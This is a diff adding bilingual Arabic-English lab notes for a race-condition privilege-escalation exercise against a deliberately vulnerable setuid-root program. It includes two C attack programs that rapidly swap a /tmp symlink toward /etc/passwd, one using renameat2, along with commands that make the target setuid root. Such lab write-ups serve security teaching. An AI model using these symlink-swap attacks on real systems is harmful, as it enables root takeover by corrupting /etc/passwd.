@@ -219,6 +219,168 @@ su test
 * (Press Enter when prompted for the password to confirm successful transition to root privileges)
 ```
 
+# Task 2.B: Launching the Real Race Condition Attack
+# المهمة 2.ب: إطلاق هجوم سباق الشروط الحقيقي
+
+This file documents the complete practical steps and explanations for executing the real Race Condition attack (Task 2.B), moving away from the simulated slow machine to a high-speed parallel attack.
+هذا الملف يوثق الخطوات العملية الشاملة والشرح لتنفيذ هجوم الـ Race Condition الحقيقي (Task 2.B)، والانتقال من محاكاة الجهاز البطيء إلى هجوم عالي السرعة بالتوازي.
+
+---
+
+## 1. Concept Overview / فكرة المهمة العامة
+
+[AR] 
+في هذه المهمة، قمنا بإزالة محاكاة التأخير (`sleep(10)`) للعودة إلى الحالة الواقعية والخطيرة للبرنامج المصاب. وبما أن الفارق الزمني (Race Window) صغير جداً، لا يمكننا تنفيذه يدوياً؛ لذلك اعتمدنا على تشغيل برنامج هجوم مخصص بلغة C (`attack.c`) للتبديل السريع جداً بين الروابط بالتوازي مع سكربت استهداف مكرر (`target_process.sh`).
+
+[EN] 
+In this task, we removed the delay simulation (`sleep(10)`) to return to the realistic and vulnerable state of the program. Since the race window is extremely small, manual execution is impossible; therefore, we utilized a dedicated C attack program (`attack.c`) to switch symlinks at high speed in parallel with a repeated targeting script (`target_process.sh`).
+
+---
+
+## 2. Practical Execution Steps / الخطوات التنفيذية العملية
+
+### Step 1: Remove the Sleep Statement from the Vulnerable Program
+### الخطوة الأولى: إزالة أمر الانتظار من البرنامج المصاب
+
+[AR] 
+قمنا بفتح كود البرنامج المصاب وإزالة سطر الـ `sleep(10)` ليعود البرنامج لسرعته الطبيعية، ثم أعدنا بنائه ومنحه صلاحيات الـ Root.
+
+[EN] 
+We opened the vulnerable program's code, removed the `sleep(10)` line to restore its normal speed, and then recompiled it and granted it root privileges.
+
+```bash
+nano vulp.c
+```
+* (Remove the sleep(10); line from the code, save the file and exit)
+```besh
+gcc vulp.c -o vulp
+sudo chown root vulp
+sudo chmod 4755 vulp
+touch /tmp/XYZ
+```
+### Step 2: Create the High-Speed Attack Script (attack.c)
+* We created a C program running an infinite loop (while(1)) to toggle the temporary symlink /tmp/XYZ at extreme speed between /etc/passwd and /dev/null.
+```besh
+nano attack.c
+
+#include <unistd.h>
+int main(){
+    while(1) {
+        unlink("/tmp/XYZ");
+        symlink("/etc/passwd", "/tmp/XYZ");
+        usleep(1000);
+
+        unlink("/tmp/XYZ");
+        link("/dev/null", "/tmp/XYZ");
+        usleep(1000);
+    }
+    return 0;
+}
+
+```
+```besh
+gcc attack.c -o attack
+```
+### Step 3: Run the Real Attack in Parallel (Two Terminals)
+الخطوة الثالثة: تشغيل الهجوم الحقيقي بالتوازي (في نافذتين)
+[AR]
+لكى ننجح في اقتناص النافذة الزمنية للثغرة، قمنا بتشغيل العملية على طرفيتين (Terminals) في نفس الوقت:
+
+النافذة الأولى: لتشغيل برنامج التبديل السريع (attack).
+
+النافذة الثانية: لتشغيل سكربت استهداف البرنامج المصاب مراراً وتكراراً مع معالجة الصلاحيات بـ sudo.
+
+[EN]
+To successfully capture the race window, we ran the process across two terminals simultaneously:
+
+Terminal 1: To run the rapid-switching program (attack).
+
+Terminal 2: To run the automated target script repeatedly with sudo.
+
+#### Terminal 1:
+```besh
+./attack
+```
+#### Terminal 2:
+```besh
+sudo ./target_process.sh
+```
+### Step 4: Attack Success & Verification / نجاح الهجوم والتحقق
+[AR]
+بعد ترك السكربتين يعملان معاً لعدة ثوانٍ، نجح السباق وتوقف السكربت في النافذة الثانية تلقائياً طابعاً رسالة النجاح:
+"STOP... The passwd file has been changed"
 
 
- 
+
+# Task 2.C: An Improved Attack Method
+# المهمة 2.ج: طريقة هجوم محسنة
+
+This file documents the concepts and steps for Task 2.C, which introduces an improved, atomic attack method using the `renameat2` system call to prevent race condition issues within the attack program itself.
+هذا الملف يوثق مفاهيم وخطوات المهمة 2.ج، والتي تقدم طريقة هجوم محسنة وعملية ذرية (Atomic) باستخدام استدعاء النظام `renameat2` لمنع مشاكل سباق الشروط داخل برنامج الهجوم نفسه.
+
+---
+
+## 1. Concept Overview / فكرة المهمة العامة
+
+[AR] 
+في المهمة السابقة (2.B)، قد يقع برنامج الهجوم في مشكلة إذا تم مقاطعته بعد تنفيذ `unlink()` وقبل `symlink()`، حيث يقوم البرنامج المصاب بإنشاء الملف المؤقت ويصبح ملكاً للـ Root (`sticky bit issue`)، مما يمنع برنامج الهجوم من حذفه لاحقاً ويتوقف عن العمل. لحل هذه المشكلة، نحتاج إلى جعل عملية تبديل الروابط عملية واحدة غير قابلة للمقاطعة (Atomic) باستخدام `renameat2` و `RENAME_EXCHANGE`.
+
+[EN] 
+In Task 2.B, the attack program could fail if interrupted between `unlink()` and `symlink()`, causing the victim program to create the temp file as root (due to the sticky bit), preventing further deletion. To solve this, we need to make the symlink swapping atomic using `renameat2` and `RENAME_EXCHANGE`.
+
+---
+
+## 2. Practical Execution Steps / الخطوات التنفيذية العملية
+
+### Step 1: Update the Attack Program (attack.c)
+### الخطوة الأولى: تحديث برنامج الهجوم (attack.c)
+
+[AR] 
+قمنا بتعديل كود برنامج الهجوم ليستخدم الطريقة المحسنة التي تعتمد على `renameat2` لتبديل الروابط بشكل ذري وآمن دون مشاكل سباق داخلية.
+
+[EN] 
+We updated the attack program code to use the improved method relying on `renameat2` for atomic and safe symlink swapping.
+
+```bash
+nano attack.c
+```
+* (Paste the new atomic attack code)
+```bash
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main()
+{
+    unsigned int flags = RENAME_EXCHANGE;
+    unlink("/tmp/XYZ");
+    symlink("/dev/null", "/tmp/XYZ");
+    unlink("/tmp/ABC");
+    symlink("/etc/passwd", "/tmp/ABC");
+
+    while(1) {
+        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
+    }
+    return 0;
+}
+```
+* We compiled the updated attack program:
+gcc attack.c -o attack
+
+Like before, we ran the attack using two terminals in parallel to ensure fast and secure success:
+
+Terminal 1: Run the updated attack program (./attack).
+
+Terminal 2: Run the target script with privileges (sudo ./target_process.sh).
+
+Terminal 1:
+
+```Bash
+./attack
+```
+Terminal 2:
+
+```Bash
+sudo ./target_process.sh
+```
